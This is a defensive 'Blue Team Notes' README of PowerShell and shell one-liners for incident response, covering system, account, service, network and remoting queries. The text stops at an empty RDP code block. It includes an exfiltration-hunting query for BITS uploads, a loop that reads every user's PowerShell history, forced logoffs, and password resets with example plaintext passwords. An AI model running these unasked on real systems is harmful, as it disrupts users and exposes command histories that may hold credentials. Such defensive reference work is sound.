<p align="center">
  <img width="450" height="450" src="https://user-images.githubusercontent.com/44196051/120006585-f0dc3c00-bfd0-11eb-98d9-da3eb59edbda.png">
</p>

# Blue Team Notes
A collection of one-liners, small scripts, and some useful tips for blue team work. 

I've included screenshots where possible so you know what you're getting. 

## Contact me
If you see a mistake, or have an easier way to run a command then you're welcome to hit me up on [Twitter](https://twitter.com/Purp1eW0lf) or commit an issue here. 

If you want to contribute I'd be grateful for the command and a screenshot. I'll of course add you as a contributor

If you want to find me elsehwere, for reasons(?), searching 'Dray Agha' on the internets should find whatever it is you're looking for. 

## Did the Notes help?

I hope the Blue Team Notes help you catch an adversary, thwart an attack, or even just helps you learn.
If you've benefited from the Blue Team Notes, would you kindly consider making a donation to one or two charities. 

Donate as much or little money as you like, of course. I have some UK charities you could donate to: [Great Ormond Street - Children's hospital](https://www.gosh.org/_donate/?amount=3&frequency=single&campaign=1284), [Cancer Research](https://donate.cancerresearchuk.org/support-us/your-donation?type=single&amount=3), and [Feeding Britain - food charity](https://feedingbritain.org/donate/)

## Table of Contents
- [Shell Style](#shell-style)
- [Windows](#Windows)
  * [OS Queries](#os-queries)
  * [Account Queries](#account-queries)
  * [Service Queries](#service-queries)
  * [Network Queries](#network-queries)
  * [Remoting Queries](#remoting-queries)
  * [Firewall Queries](#firewall-queries)
  * [SMB Queries](#smb-queries)
  * [Process Queries](#process-queries)
  * [Recurring Task Queries](#recurring-task-queries)
  * [File Queries](#file-queries)
  * [Registry Queries](#registry-queries)
  * [Driver Queries](#driver-queries)
  * [DLL Queries](#dll-queries)
  * [AV Queries](#AV-Queries)
  * [Log Queries](#log-queries)
  * [Powershell Tips](#powershell-tips)
- [Linux](#linux)
  * [Bash History](#bash-history)
  * [Grep and Ack](#grep-and-ack)
  * [Processes and Networks](#processes-and-networks)
  * [Files](#files)
  * [Bash Tips](#bash-tips)
- [macOS](#macOS)
  * [Reading .plist files](#Reading-.plist-files)
  * [Quarantine Events](#Quarantine-Events)
  * [Install History](Install-History)
  * [Most Recently Used (MRU)](#Most-Recently-Used-(MRU))
  * [Audit Logs](#Audit-Logs)
  * [Command line history](#Command-line-history)
  * [WHOMST is in the Admin group](#WHOMST-is-in-the-Admin-group) 
  * [Persistence locations](#Persistence-locations) 
  * [Transparency, Consent, and Control (TCC)](#Transparency,-Consent,-and-Control-(TCC))
  * [Built-In Security Mechanisms](#Built-In-Security-Mechanisms)
- [Malware](#Malware)
  * [Rapid Malware Analysis](#rapid-malware-Analysis)
  * [Unquarantine Malware](#Unquarantine-Malware)
  * [Process Monitor](#process-monitor)
  * [Hash Check Malware](#hash-check-malware)
  * [Decoding Powershell](#decoding-powershell)
- [SOC](#SOC)
  * [Sigma Converter](#sigma-converter)
  * [SOC Prime](#soc-prime)
- [Honeypots](#honeypots)
  * [Basic Honeypots](#basic-honeypots) 
- [Network Traffic](#network-traffic)
  * [Capture Traffic](#capture-traffic)
  * [TShark](#tshark)
  * [Extracting Stuff](#extracting-stuff)
  * [PCAP Analysis IRL](#pcap-analysis-irl)
- [Digital Forensics](#Digital-Forensics) 
  * [Volatility](#volatility)
  * [Quick Forensics](#quick-forensics)
  * [Chainsaw](#chainsaw)
  * [Browser History](#browser-history)
  * [Which logs to pull in an incident](#Which-logs-to-pull-in-an-incident)
  * [USBs](#USBs)
  * [Reg Ripper](#reg-ripper)

---

As you scroll along, it's easy to lose orientation. Wherever you are in the Blue Team Notes, if you look to the top-left of the readme you'll see a little icon. This is a small table of contents, and it will help you figure out where you are, where you've been, and where you're going

![image](https://user-images.githubusercontent.com/44196051/122612244-b834fd00-d07a-11eb-9281-e4d93f4f6059.png)

As you go through sections, you may notice the arrowhead that says 'section contents'. I have nestled the sub-headings in these, to make life a bit easier.

![image](https://user-images.githubusercontent.com/44196051/124335025-d4fc2500-db90-11eb-86cc-80fc8db2c193.png)

---

# Shell Style

<details>
    <summary>section contents</summary>

  + [Give shell timestamp](#give-shell-timestamp)
    - [CMD](#cmd)
    - [Pwsh](#pwsh)
    - [Bash](#bash)

</details>

### Give shell timestamp
For screenshots during IR, I like to have the date, time, and sometimes the timezone in my shell
#### CMD
```bat
setx prompt $D$S$T$H$H$H$S$B$S$P$_--$g
:: all the H's are to backspace the stupid microsecond timestamp
:: $_ and --$g seperate the date/time and path from the actual shell
:: We make the use of the prompt command: https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/prompt
:: setx is in fact the command line command to write variables to the registery
:: We are writing the prompt's new timestamp value in the cmd line into the reg so it stays, otherwise it would not stay in the cmdline when we closed it.
```
![image](https://user-images.githubusercontent.com/44196051/119978466-97b0e000-bfb1-11eb-83e1-022efba7dc96.png)

#### Pwsh
```powershell
###create a powershell profile, if it doesnt exist already
New-Item $Profile -ItemType file –Force
##open it in notepad to edit
function prompt{ "[$(Get-Date)]" +" | PS "+ "$(Get-Location) > "}
##risky move, need to tighten this up. Change your execution policy or it won't
#run the profile ps1
#run as powershell admin
Set-ExecutionPolicy RemoteSigned
```
![image](https://user-images.githubusercontent.com/44196051/119978226-486aaf80-bfb1-11eb-8e9e-52eabf2cde4c.png)

#### Bash
```bash
##open .bashrc
sudo nano .bashrc
#https://www.howtogeek.com/307701/how-to-customize-and-colorize-your-bash-prompt/
##date, time, colour, and parent+child directory only, and -> promptt
PS1='\[\033[00;35m\][`date  +"%d-%b-%y %T %Z"]` ${PWD#"${PWD%/*/*}/"}\n\[\033[01;36m\]-> \[\033[00;37m\]'
      ##begin purple  #year,month,day,time,timezone #show last 2 dir #next line, cyan,->prompt #back to normal white text
#restart the bash source
source ~/.bashrc
```
![image](https://user-images.githubusercontent.com/44196051/119981537-a7cabe80-bfb5-11eb-8b7e-1e5ba7f5ba99.png)
---
# Windows
<details>
    <summary>section contents</summary>
  
  + [OS Queries](#os-queries)
  + [Account Queries](#account-queries)
  + [Service Queries](#service-queries)
  + [Network Queries](#network-queries)
  + [Remoting Queries](#remoting-queries)
  + [Firewall Queries](#firewall-queries)
  + [SMB Queries](#smb-queries)
  + [Process Queries](#process-queries)
  + [Recurring Task Queries](#recurring-task-queries)
  + [File Queries](#file-queries)
  + [Registry Queries](#registry-queries)
  + [Driver Queries](#driver-queries)
  + [DLL Queries](#dll-queries)
  + [Log Queries](#log-queries)
  + [Powershell Tips](#powershell-tips)


</details>
 
I've generally used these Powershell queries with [Velociraptor](https://www.velocidex.com), which can query thousands of endpoints at once.

## OS Queries

<details>
    <summary>section contents</summary>

  + [Get Fully Qualified Domain Name](#get-fully-qualified-domain-name)
  + [Get OS and Pwsh info](#get-os-and-pwsh-info)
    - [Hardware Info](#hardware-info)
  + [Time info](#time-info)
    - [Human Readable](#human-readable)
    - [Machine comparable](#machine-comparable)
    - [Compare UTC time from Local time](#compare-utc-time-from-local-time)
  + [Update Info](#update-info)
    - [Get Patches](#get-patches)
    - [Manually check if patch has taken](#manually-check-if-patch-has-taken)
      * [Microsoft Support Page](#microsoft-support-page)
      * [On Host](#on-host)
      * [Discrepencies](#discrepencies)

</details>

## Get Fully Qualified Domain Name
```powershell
([System.Net.Dns]::GetHostByName(($env:computerName))).Hostname

# Get just domain name
(Get-WmiObject -Class win32_computersystem).domain
```
![image](https://user-images.githubusercontent.com/44196051/123553586-ef3e9900-d773-11eb-9207-af279dc2b3e3.png)
  
### Get OS and Pwsh info
This will print out the hostname, the OS build info, and the powershell version
```powershell
$Bit = (get-wmiobject Win32_OperatingSystem).OSArchitecture ; 
$V = $host | select-object -property "Version" ; 
$Build = (Get-WmiObject -class Win32_OperatingSystem).Caption ; 
write-host "$env:computername is a $Bit $Build with Pwsh $V
```
![image](https://user-images.githubusercontent.com/44196051/120313634-2be0b700-c2d2-11eb-919f-5792169a1dba.png)

#### Hardware Info

If you want, you can get Hardware, BIOS, and Disk Space info of a machine

```powershell
#Get BIOS Info
gcim -ClassName Win32_BIOS | fl Manufacturer, Name, SerialNumber, Version;
#Get processor info
gcim -ClassName Win32_Processor | fl caption, Name, SocketDesignation;
#Computer Model
gcim -ClassName Win32_ComputerSystem | fl Manufacturer, Systemfamily, Model, SystemType
#Disk space in Gigs, as who wants bytes?
gcim  -ClassName Win32_LogicalDisk |
Select -Property DeviceID, DriveType, @{L='FreeSpaceGB';E={"{0:N2}" -f ($_.FreeSpace /1GB)}}, @{L="Capacity";E={"{0:N2}" -f ($_.Size/1GB)}} | fl

## Let's calculate an individual directory, C:\Sysmon, and compare with disk memory stats
$size = (gci c:\sysmon | measure Length -s).sum / 1Gb;
write-host " Sysmon Directory in Gigs: $size";
$free = gcim  -ClassName Win32_LogicalDisk | select @{L='FreeSpaceGB';E={"{0:N2}" -f ($_.FreeSpace /1GB)}};
echo "$free";
$cap = gcim  -ClassName Win32_LogicalDisk | select @{L="Capacity";E={"{0:N2}" -f ($_.Size/1GB)}} 
echo "$cap"
```
![image](https://user-images.githubusercontent.com/44196051/120922608-0c76cf00-c6c2-11eb-810b-288db6256bba.png)

### Time info
#### Human Readable
Get a time that's human readable
```powershell
Get-Date -UFormat "%a %Y-%b-%d %T UTC:%Z" 
```
![image](https://user-images.githubusercontent.com/44196051/120298372-f03df100-c2c1-11eb-92ab-d642c26133ab.png)

#### Machine comparable
This one is great for doing comparisons between two strings of time
```powershell
[Xml.XmlConvert]::ToString((Get-Date).ToUniversalTime(), [System.Xml.XmlDateTimeSerializationMode]::Utc) 
```
![image](https://user-images.githubusercontent.com/44196051/120314399-1e77fc80-c2d3-11eb-9a75-f9e677153d86.png)

#### Compare UTC time from Local time
```powershell
$Local = get-date;$UTC = (get-date).ToUniversalTime();
write-host "LocalTime is: $Local";write-host "UTC is: $UTC"
```
![image](https://user-images.githubusercontent.com/44196051/120301782-1fa22d00-c2c5-11eb-908f-763897fac25f.png)

### Update Info

#### Get Patches
Will show all patch IDs and their installation date
```powershell
get-hotfix|
select-object HotFixID,InstalledOn|
Sort-Object  -Descending -property InstalledOn|
format-table -autosize
```
![image](https://user-images.githubusercontent.com/44196051/120307390-d5bc4580-c2ca-11eb-8ffe-d1a835b1ce40.png)

Find why an update failed
```powershell
$Failures = gwmi -Class Win32_ReliabilityRecords;
$Failures | ? message -match 'failure'  | Select -ExpandProperty message 
```


#### Manually check if patch has taken
This happened to me during the March 2021 situation with Microsoft Exchange's ProxyLogon. The sysadmin swore blind they had patched the server, but neither `systeminfo` of `get-hotfix` was returning with the correct KB patch.

The manual workaround isn't too much ballache

##### Microsoft Support Page
First identify the ID number of the patch you want. And then find the dedicated Microsoft support page for it. 

For demonstration purposes, let's take `KB5001078` and it's [corresponding support page](https://support.microsoft.com/en-us/topic/kb5001078-servicing-stack-update-for-windows-10-version-1607-february-12-2021-3e19bfd1-7711-48a8-978b-ce3620ec6362). You'll be fine just googling the patch ID number.

![image](https://user-images.githubusercontent.com/44196051/120308871-7a8b5280-c2cc-11eb-850f-da46727a94ac.png)

Then click into the dropdown relevant to your machine. 
![image](https://user-images.githubusercontent.com/44196051/120309734-7f043b00-c2cd-11eb-9cf6-3a7ca6be6691.png)

Here you can see the files that are included in a particular update. The task now is to pick a handful of the patch-files and compare your host machine. See if these files exist too, and if they do do they have similar / same dates on the host as they do in the Microsoft patch list?

##### On Host
Let us now assume you don't know the path to this file on your host machine. You will have to recursively search for the file location. It's a fair bet that the file will be in `C:\Windows\` (but not always), so lets' recursively look for `EventsInstaller.dll`

```powershell
$file = 'EventsInstaller.dll'; $directory = 'C:\windows' ;
gci -Path $directory -Filter $file -Recurse -force|
sort-object  -descending -property LastWriteTimeUtc | fl *
```
We'll get a lot of information here, but we're really concerned with is the section around the various *times*. As we sort by the `LastWriteTimeUtc`, the top result should in theory be the latest file of that name...but this is not always true.

![image](https://user-images.githubusercontent.com/44196051/120312109-37cb7980-c2d0-11eb-95e2-8655cd89f9cc.png)

##### Discrepencies
I've noticed that sometimes there is a couple days discrepency between dates. 

![image](https://user-images.githubusercontent.com/44196051/120313127-7d3c7680-c2d1-11eb-8941-e96575a63138.png)

For example in our screenshot, on the left Microsoft's support page supposes the `EventsInstaller.dll` was written on the 13th January 2021. And yet our host on the right side of the screenshot comes up as the 14th January 2021. This is fine though, you've got that file don't sweat it. 

---

## Account Queries

<details>
    <summary>section contents</summary>

  + [Users recently created in Active Directory](#users-recently-created-in-active-directory)
  + [Hone in on suspicious user](#hone-in-on-suspicious-user)
  + [Retrieve local user accounts that are enabled](#retrieve-local-user-accounts-that-are-enabled)
  + [Find all users currently logged in](#find-all-users-currently-logged-in)
    - [Find all users logged in across entire AD](#Find-all-users-logged-in-across-entire-AD)
  + [Evict User](#Evict-User)
    - [Force user logout](#Force-user-logout)
    - [Force user new password](#force-user-new-password)
    - [Disable AD Account](#Disable-ad-account) 
    - [Evict from Group](#evict-from-group) 
  + [Computer / Machine Accounts](#computer---machine-accounts)
    - [Show machine accounts that are apart of interesting groups.](#show-machine-accounts-that-are-apart-of-interesting-groups)
    - [Reset password for a machine account.](#reset-password-for-a-machine-account)
  + [Query Group Policy](#query-group-policy)
  + [All Users PowerShell History](#All-Users-PowerShell-History)

</details>

### Users recently created in Active Directory
*Run on a Domain Controller*.

Change the AddDays field to more or less days if you want. Right now set to seven days.

The 'when Created' field is great for noticing some inconsistencies. For example, how often are users created at 2am?
```powershell
import-module ActiveDirectory;
$When = ((Get-Date).AddDays(-7)).Date; 
Get-ADUser -Filter {whenCreated -ge $When} -Properties whenCreated |
sort whenCreated -descending 
```

![image](https://user-images.githubusercontent.com/44196051/120461945-614cd980-c392-11eb-8352-2141ee42efdf.png)

### Hone in on suspicious user
You can use the `SamAccountName` above to filter
```powershell
import-module ActiveDirectory;
Get-ADUser -Identity HamBurglar -Properties *
```
![image](https://user-images.githubusercontent.com/44196051/120328655-f1334a80-c2e2-11eb-97da-653553b7c01a.png)

### Retrieve local user accounts that are enabled
```powershell
 Get-LocalUser | ? Enabled -eq "True"
```
![image](https://user-images.githubusercontent.com/44196051/120561793-216f0c00-c3fd-11eb-9738-76e778c79763.png)

### Find all users currently logged in
```powershell
qwinsta
#or
quser
```
#### Find all users logged in across entire AD
If you want to find every single user logged in on your Active Directory, with the machine they are also signed in to. 

I can reccomend YossiSassi's [Get-UserSession.ps1](https://github.com/YossiSassi/Get-UserSession/blob/master/Get-UserSession.ps1) and [Get-RemotePSSession.ps1](https://github.com/YossiSassi/Get-RemotePSSession/blob/master/Get-RemotePSSession.ps1).

This will generate a LOT of data in a real-world AD though.

<img width="595" alt="image" src="https://user-images.githubusercontent.com/44196051/154706183-ea6be4ad-a811-42ae-bb53-c1ddbc30524b.png">

### Evict User

#### Force user logout
You may need to evict a user from a session - perhaps you can see an adversary has been able to steal a user's creds and is leveraging their account to traverse your environment

```powershell
#show the users' session
qwinsta

#target their session id
logoff 2 /v
```
![2021-11-15_15-03](https://user-images.githubusercontent.com/44196051/141804502-65d627b3-137b-483e-a220-701d2e5057df.png)

#### Force user new password
From the above instance, we may want to force a user to have a new password - one the adversary does not have 

##### for Active Directory
```powershell
$user = "lizzie" ; $newPass = "HoDHSyxkzP-cuzjm6S6VF-7rvqKyR";

#Change password twice. 
#First can be junk password, second time can be real new password
Set-ADAccountPassword -Identity $user -Reset -NewPassword (ConvertTo-SecureString -AsPlainText "6;wB3yj9cI8X" -Force) -verbose
Set-ADAccountPassword -Identity $user -Reset -NewPassword (ConvertTo-SecureString -AsPlainText "$newPass" -Force) -verbose
```

![image](https://user-images.githubusercontent.com/44196051/141806623-ee167dfa-5b36-4535-b829-545d21181e95.png)

##### For local non-domain joined machines
```powershell
#for local users
net user #username #newpass
net user frank "lFjcVR7fW2-HoDHSyxkzP"
```
![image](https://user-images.githubusercontent.com/44196051/141804977-166ac050-ba1d-433d-ab6b-76a1e60627bb.png)

#### Disable AD Account

```powershell
#needs the SAMAccountName
$user = "lizzie"; 
Disable-ADAccount -Identity "$user" #-whatif can be appended

#check its disabled
(Get-ADUser -Identity $user).enabled

#renable when you're ready
Enable-ADAccount -Identity "$user" -verbose
```
![image](https://user-images.githubusercontent.com/44196051/141814376-94716c11-6e8e-4d5b-ad31-51a656095f66.png)

![image](https://user-images.githubusercontent.com/44196051/141814532-da45aa38-623e-4a9e-ab2a-27473350398d.png)

#### Disable local Account

```powershell
# list accounts with  Get-LocalUser
Disable-LocalUser -name "bad_account$"
```

<img width="756" alt="image" src="https://user-images.githubusercontent.com/44196051/187993103-1ad5d55a-ab9f-4479-9a46-171f5ed8f30e.png">


#### Evict from Group
Good if you need to quickly eject an account from a specific group, like administrators or remote management.

```powershell
$user = "erochester"
remove-adgroupmember -identity Administrators -members $User -verbose -confirm:$false
```

![image](https://user-images.githubusercontent.com/44196051/150777790-38409fa8-82f0-4060-aeeb-f95b45de836f.png)


### Computer / Machine Accounts
Adversaries like to use Machine accounts (accounts that have a $) as these often are overpowered AND fly under the defenders' radar

#### Show machine accounts that are apart of interesting groups. 
There may be misconfigurations that an adversary could take advantadge. 
```powershell
Get-ADComputer -Filter * -Properties MemberOf | ? {$_.MemberOf}
```
![image](https://user-images.githubusercontent.com/44196051/120346984-cac9db00-c2f3-11eb-8ab0-1112aa2183a9.png)

#### Reset password for a machine account. 
Good for depriving adversary of pass they may have got. 
Also good for re-establishing trust if machine is kicked out of domain trust for reasons(?)

```powershell
Reset-ComputerMachinePassword
```
### All Users PowerShell History

During an IR, you will want to access other users PowerShell history. However, the get-history command only will retrieve the current shell's history, which isn't very useful.

Instead, [PowerShell in Windows 10 saves the last 4096 commands in a particular file](https://social.technet.microsoft.com/Forums/en-US/7c3cd614-f793-4b99-b826-3dff917ebe88/powershell-commands-history-windows-10-1809-psreadline?forum=win10itprogeneral#:~:text=By%20default%2C%20the%20PowerShell%20in,separately%20for%20PowerShell%20and%20ISE.). On an endpoint, we can run a quick loop that will print the full path of the history file - showing which users history it is showing - and then show the contents of that users' PwSh commands

```powershell
$Users = (Gci C:\Users\*\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt).FullName
$Pasts = @($Users);

foreach ($Past in $Pasts) {
  write-host "`n----User Pwsh History Path $Past---`n" -ForegroundColor Magenta; 
  get-content $Past
}

```

![image](https://user-images.githubusercontent.com/44196051/137767902-e969f32d-5b2d-47ae-a918-abb803117f34.png)

And check this one too

```powershell
c:\windows\system32\config\systemprofile\appdata\roaming\microsoft\windows\powershell\psreadline\consolehost_history.txt
```

---

## Service Queries

<details>
    <summary>section contents</summary>

  + [Show Services](#Show-Services)
  + [Hone in on specific Service](#hone-in-on-specific-service)
  + [Kill a service](#kill-a-service)
  + [Hunting potential sneaky services](#Hunting-potential-sneaky-services)
  
</details>

### Show Services 

Let's get all the services and sort by what's running
```powershell
get-service|Select Name,DisplayName,Status|
sort status -descending | ft -Property * -AutoSize|
Out-String -Width 4096
```
![image](https://user-images.githubusercontent.com/44196051/120901027-354e8400-c630-11eb-8ac8-869864349cf5.png)

Now show the underlying executable supporting that service

```powershell
Get-WmiObject win32_service |? State -match "running" |
select Name, DisplayName, PathName, User | sort Name |
ft -wrap -autosize
```

![image](https://user-images.githubusercontent.com/44196051/150961296-3778e68c-c85d-4310-aa37-865fd3688889.png)


### Hone in on specific Service
If a specific service catches your eye, you can get all the info for it.  Because the single and double qoutes are important to getting this right, I find it easier to just put the DisplayName of the service I want as a variable, as I tend to fuck up the displayname filter bit

```powershell
$Name = "eventlog"; 
gwmi -Class Win32_Service -Filter "Name = '$Name' " | fl *

#or this, but you get less information compared to the one about tbh
get-service -name "eventlog" | fl *   
```
![image](https://user-images.githubusercontent.com/44196051/120341774-14fc8d80-c2ef-11eb-8b1d-31db7620b7cb.png)


### Kill a service
```powershell
Get-Service -DisplayName "meme_service" | Stop-Service -Force -Confirm:$false -verbose
```
### Hunting potential sneaky services
I saw a red team tweet regarding [sneaky service install](https://twitter.com/Alh4zr3d/status/1580925761996828672?s=20&t=3IV0LmMvw-ThCCj_kgpjwg). To identify this, you can deploy the following:

```powershell
Get-ItemProperty -Path "HKLM:\System\CurrentControlSet\services\*" | 
ft PSChildName, ImagePath -autosize | out-string -width 800

# Grep out results from System32 to reduce noise, though keep in mind adversaries can just put stuff in there too
Get-ItemProperty -Path "HKLM:\System\CurrentControlSet\services\*" | 
where ImagePath -notlike "*System32*" | 
ft PSChildName, ImagePath -autosize | out-string -width 800

```
<img width="1372" alt="image" src="https://user-images.githubusercontent.com/44196051/202874716-ed5d7859-72a0-48c6-8e29-4d8a8168b2ae.png">


---

## Network Queries

<details>
    <summary>section contents</summary>

  + [Show TCP connections and underlying process](#Show-TCP-connections-and-underlying-process)
  + [Find internet established connections, and sort by time established](#find-internet-established-connections--and-sort-by-time-established)
  + [Sort remote IP connections, and then unique them](#sort-remote-ip-connections--and-then-unique-them)
    - [Hone in on a suspicious IP](#hone-in-on-a-suspicious-ip)
  + [Show UDP connections](#show-udp-connections)
  + [Kill a connection](#kill-a-connection)
  + [Check Hosts file](#check-Hosts-file)
    - [Check Host file Time](#Check-Host-file-time)
  + [DNS Cache](#dns-cache)
    - [Investigate DNS](#investigate-dns)
  + [IPv6](#ipv6)
    - [Disable Priority Treatment of IPv6](#Disable-Priority-Treatment-of-IPv6)
   + [BITS Queries](#bits-queries)  

</details>

### Show TCP connections and underlying process

This one is so important, I have it [listed twice](#Processes-and-TCP-Connections) in the blue team notes

I have a neat one-liner for you. This will show you the local IP and port, the remote IP andport, the process name, and the underlying executable of the process!

You could just use `netstat -b`, which gives you SOME of this data

But instead, try this bad boy on for size:

```powershell
Get-NetTCPConnection |
select LocalAddress,localport,remoteaddress,remoteport,state,@{name="process";Expression={(get-process -id $_.OwningProcess).ProcessName}}, @{Name="cmdline";Expression={(Get-WmiObject Win32_Process -filter "ProcessId = $($_.OwningProcess)").commandline}} | 
sort Remoteaddress -Descending | ft -wrap -autosize

#### you can search/filter by the commandline process, but it will come out janky. 
##### in the final field we're searching by `anydesk`
Get-NetTCPConnection |
select LocalAddress,localport,remoteaddress,remoteport,state,@{name="process";Expression={(get-process -id $_.OwningProcess).ProcessName}}, @{Name="cmdline";Expression={(Get-WmiObject Win32_Process -filter "ProcessId = $($_.OwningProcess)").commandline}} 
|  Select-String -Pattern 'anydesk'
```

![image](https://user-images.githubusercontent.com/44196051/150955379-872e2b5f-6d88-4b3f-929f-debaa8fd1036.png)

######## **Bound to catch bad guys or your moneyback guaranteed!!!!**


### Find internet established connections, and sort by time established
You can always sort by whatever value you want really. CreationTime is just an example
```powershell
Get-NetTCPConnection -AppliedSetting Internet |
select-object -property remoteaddress, remoteport, creationtime |
Sort-Object -Property creationtime |
format-table -autosize
```
![image](https://user-images.githubusercontent.com/44196051/120314725-73b40e00-c2d3-11eb-9dbf-3b0582a9b2d0.png)

### Sort remote IP connections, and then unique them
This really makes strange IPs stand out
```powershell
(Get-NetTCPConnection).remoteaddress | Sort-Object -Unique 
```
![image](https://user-images.githubusercontent.com/44196051/120314835-8dedec00-c2d3-11eb-8469-e658eb743364.png)

#### Hone in on a suspicious IP
If you see suspicious IP address in any of the above, then I would hone in on it
```powershell
Get-NetTCPConnection |
? {($_.RemoteAddress -eq "1.2.3.4")} |
select-object -property state, creationtime, localport,remoteport | ft -autosize

## can do this as well 
 Get-NetTCPConnection -remoteaddress 0.0.0.0 |
 select state, creationtime, localport,remoteport | ft -autosize
 ```
 ![image](https://user-images.githubusercontent.com/44196051/120313809-68141780-c2d2-11eb-85ac-5e369715f8ed.png)

### Show UDP connections
You can generally filter pwsh UDP the way we did the above TCP
```powershell
 Get-NetUDPEndpoint | select local*,creationtime, remote* | ft -autosize
```
![image](https://user-images.githubusercontent.com/44196051/120562989-7744b380-c3ff-11eb-963b-443cc9176643.png)


### Kill a connection
There's probably a better way to do this. But essentially, get the tcp connection that has the specific remote IPv4/6 you want to kill. It will collect the OwningProcess. From here, get-process then filters for those owningprocess ID numbers. And then it will stop said process. Bit clunky
``` powershell
stop-process -verbose -force -Confirm:$false (Get-Process -Id (Get-NetTCPConnection -RemoteAddress "1.2.3.4" ).OwningProcess)
```

### Check Hosts file
Some malware may attempt DNS hijacking, and alter your Hosts file
```powershell
gc -tail 4 "C:\Windows\System32\Drivers\etc\hosts"

#the above gets the most important bit of the hosts file. If you want more, try this:
gc "C:\Windows\System32\Drivers\etc\hosts"
```
#### Check Host file Time
Don't trust timestamps....however, may be interesting to see if altered recently
```powershell
gci "C:\Windows\System32\Drivers\etc\hosts" | fl *Time* 

```
![image](https://user-images.githubusercontent.com/44196051/120916488-d4f82a80-c6a1-11eb-8551-ac495ce2de68.png)

### DNS Cache

Collect the DNS cache on an endpoint. Good for catching any sneaky communication or sometimes even DNS C2

```powershell
Get-DnsClientCache | out-string -width 1000
```

![image](https://user-images.githubusercontent.com/44196051/121901947-c99aa400-cd1e-11eb-8454-093c54dd2086.png)

#### Investigate DNS

The above command will likely return a lot of results you don't really need about the communication between 'trusted' endpoints and servers. We can filter these 'trusted' hostnames out with regex, until we're left with less common results. 

On the second line of the below code, change up and insert the regex that will filter out your machines. For example, if your machines are generally called WrkSt1001.corp.local, or ServStFAX.corp.local, you can regex out that first poriton so it will exclude any and all machines that share this - so `workst|servst` would do the job. You don't need to wildcard here.

Be careful though. If you are too generic and liberal, you may end up filtering out malicious and important results. It's bettter to be a bit specific, and drill down further to amake sure you aren't filtering out important info. So for example, I wouldn't suggest filtering out short combos of letters or numbers `ae|ou|34|`

```powershell
Get-DnsClientCache | 
? Entry -NotMatch "workst|servst|memes|kerb|ws|ocsp" |
out-string -width 1000  
```

If there's an IP you're sus of, you can always take it to [WHOIS](https://who.is/) or [VirusTotal](https://www.virustotal.com/gui/home/search), as well see for other instances it appears in your network and what's up to whilst it's interacting there.

### IPv6

Since Windows Vitsa, the Windows OS prioritises IPv6 over IPv4. This lends itself to man-in-the-middle attacks, you can find some more info on exploitation [here](https://www.youtube.com/watch?v=zzbIuslB58c)

Get IPv6 addresses and networks

```powershell
Get-NetIPAddress -AddressFamily IPv6  | ft Interfacealias, IPv6Address
```
![image](https://user-images.githubusercontent.com/44196051/121316010-c8bdd880-c900-11eb-92d5-740b38a98a35.png)

#### Disable Priority Treatment of IPv6

You probably don't want to switch IPv6 straight off. And if you DO want to, then it's probably better at a DHCP level. But what we can do is change how the OS will prioritise the IPv6 over IPv4.

```powershell
#check if machine prioritises IPv6
ping $env:COMPUTERNAME -n 4 # if this returns an IPv6, the machine prioritises this over IPv4

#Reg changes to de-prioritise IPv6
New-ItemProperty “HKLM:\SYSTEM\CurrentControlSet\Services\Tcpip6\Parameters\” -Name “DisabledComponents” -Value 0x20 -PropertyType “DWord”

#If this reg already exists and has values, change the value
Set-ItemProperty “HKLM:\SYSTEM\CurrentControlSet\Services\Tcpip6\Parameters\” -Name “DisabledComponents” -Value 0x20

#you need to restart the computer for this to take affect
#Restart-Computer
```
![image](https://user-images.githubusercontent.com/44196051/121317107-e2135480-c901-11eb-9832-5930a94f80ac.png
)

### BITS Queries

```powershell
Get-BitsTransfer| 
fl DisplayName,JobState,TransferType,FileList, OwnerAccount,BytesTransferred,CreationTime,TransferCompletionTime
 
## filter out common bits jobs in your enviro, ones below are just an example, you will need to add your own context
Get-BitsTransfer|
| ? displayname -notmatch "WU|Office|Dell_Asimov|configjson" |
fl DisplayName,JobState,TransferType,FileList, OwnerAccount,BytesTransferred,CreationTime,TransferCompletionTime

## Hunt down BITS transfers that are UPLOADING, which may be sign of data exfil
Get-BitsTransfer| 
? TransferType -match "Upload" | 
fl DisplayName,JobState,TransferType,FileList, OwnerAccount,BytesTransferred,CreationTime,TransferCompletionTime
```

![image](https://user-images.githubusercontent.com/44196051/141825517-a2f7a6a8-a8c4-4230-b545-fc0d93baad5f.png)


## Remoting Queries

<details>
    <summary>section contents</summary>

  + [Powershell Remoting](#powershell-remoting)
    - [Remoting Permissions](#remoting-permissions)
    - [Query WinRM Sessions Deeper](#Query-WinRM-sessions-Deeper)
    - [Check Constrained Language](#check-constrained-language)
  + [RDP Settings](#rdp-settings)
  + [Query RDP Logs](#query-rdp-logs)
  + [Current RDP Sessions](#current-rdp-sessions) 
  + [Check Certificates](#check-certificates)
    - [Certificate Dates](#certificate-dates)
  
</details>

### Powershell Remoting

Get Powershell sessions created

```powershell
Get-PSSession
```

#### Query WinRM Sessions Deeper

You can query the above even deeper.

```powershell
get-wsmaninstance -resourceuri shell -enumerate | 
select Name, State, Owner, ClientIP, ProcessID, MemoryUsed, 
@{Name = "ShellRunTime"; Expression = {[System.Xml.XmlConvert]::ToTimeSpan($_.ShellRunTime)}},
@{Name = "ShellInactivity"; Expression = {[System.Xml.XmlConvert]::ToTimeSpan($_.ShellInactivity)}}
```

![image](https://user-images.githubusercontent.com/44196051/137759118-6ce2c557-bdea-4569-abe5-4942e82b5daf.png)

The ClientIP field will show the original IP address that WinRM'd to the remote machine. 
The times under the Shell fields at the bottom have been converted into HH:MM:SS, so in the above example, the remote PowerShell session has been running for 0 hours, 4 minutes, and 26 seconds.


#### Remoting Permissions
```powershell
Get-PSSessionConfiguration | 
fl Name, PSVersion, Permission
```

![image](https://user-images.githubusercontent.com/44196051/137760340-8150b480-6500-4822-9ec2-24168ab9e819.png)

### Check Constrained Language

To be honest, constrained language mode in Powershell can be trivally easy to mitigate for an adversary. And it's difficult to implement persistently. But anyway. You can use this quick variable to confirm if a machine has a constrained language mode for pwsh.

```powershell
$ExecutionContext.SessionState.LanguageMode
```

![image](https://user-images.githubusercontent.com/44196051/121309801-8b564c80-c8fa-11eb-9955-15bf209844e3.png)

### RDP settings

You can check if RDP capability is permissioned on an endpoint
```powershell
if ((Get-ItemProperty "hklm:\System\CurrentControlSet\Control\Terminal Server").fDenyTSConnections -eq 0){write-host "RDP Enabled" } else { echo "RDP Disabled" }
```

If you want to block RDP
```powershell
